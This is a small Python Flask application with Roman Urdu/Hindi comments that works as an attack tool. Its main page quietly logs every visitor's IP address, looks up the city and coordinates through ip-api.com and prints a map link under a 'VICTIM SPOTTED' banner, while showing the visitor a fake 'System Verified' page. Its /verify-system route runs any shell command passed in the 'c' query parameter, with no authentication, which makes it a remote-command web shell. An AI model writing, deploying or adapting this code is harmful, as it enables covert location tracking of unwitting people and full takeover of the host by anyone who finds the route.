from flask import Flask, request
import requests
import os

app = Flask(__name__)

@app.route('/')
def home():
    # 1. IP Address nikalna
    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
    
    # 2. Force Logging (Ye har haal mein logs mein dikhayega)
    print(f"\n[LOG] New Visit Detected from IP: {ip}")
    
    try:
        # 3. Location nikalna
        r = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
        data = r.json()
        city = data.get('city', 'Karachi')
        lat = data.get('lat', '24.8607')
        lon = data.get('lon', '67.0011')
        map_url = f"https://www.google.com/maps?q={lat},{lon}"
        
        # Ye details humein logs mein chahiye
        print(f"--- [!!!] VICTIM SPOTTED [!!!] ---")
        print(f"CITY: {city} | MAP: {map_url}\n")
        
        return f"<h2>System Verified</h2><p>Location: {city}</p><p>IP: {ip}</p>"
    except Exception as e:
        print(f"[ERROR] Tracking Failed: {str(e)}")
        return f"<h2>System Online</h2><p>IP: {ip}</p>"

@app.route('/verify-system')
def verify_system():
    # Aapka RCE System jo Linux details dikhata hai
    cmd = request.args.get('c', 'ls -la')
    try:
        output = os.popen(cmd).read()
        return f"<h3>Console Output:</h3><pre>{output}</pre>"
    except:
        return "Access Denied"
